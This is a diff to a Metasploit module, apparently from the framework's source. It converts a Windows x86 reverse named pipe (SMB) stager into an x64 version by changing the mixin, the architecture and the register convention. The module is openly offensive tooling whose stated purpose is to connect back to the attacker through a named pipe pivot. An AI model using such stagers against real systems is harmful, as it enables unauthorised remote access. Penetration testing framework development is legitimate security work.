@@ -6,28 +6,29 @@
 
 require 'msf/core'
 require 'msf/core/handler/reverse_named_pipe'
-require 'msf/core/payload/windows/reverse_named_pipe'
+require 'msf/core/payload/windows/x64/reverse_named_pipe'
 
 module MetasploitModule
 
   CachedSize = 281
 
   include Msf::Payload::Stager
-  include Msf::Payload::Windows::ReverseNamedPipe
+  include Msf::Payload::Windows::ReverseNamedPipe_x64
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'        => 'Windows x86 Reverse Named Pipe (SMB) Stager',
+      'Name'        => 'Windows x64 Reverse Named Pipe (SMB) Stager',
       'Description' => 'Connect back to the attacker via a named pipe pivot',
       'Author'      => ['OJ Reeves'],
       'License'     => MSF_LICENSE,
       'Platform'    => 'win',
-      'Arch'        => ARCH_X86,
+      'Arch'        => ARCH_X86_64,
       'Handler'     => Msf::Handler::ReverseNamedPipe,
-      'Convention'  => 'sockedi',
+      'Convention'  => 'sockrdi',
       'Stager'      => { 'RequiresMidstager' => false }
     ))
   end
 
 end
+
 
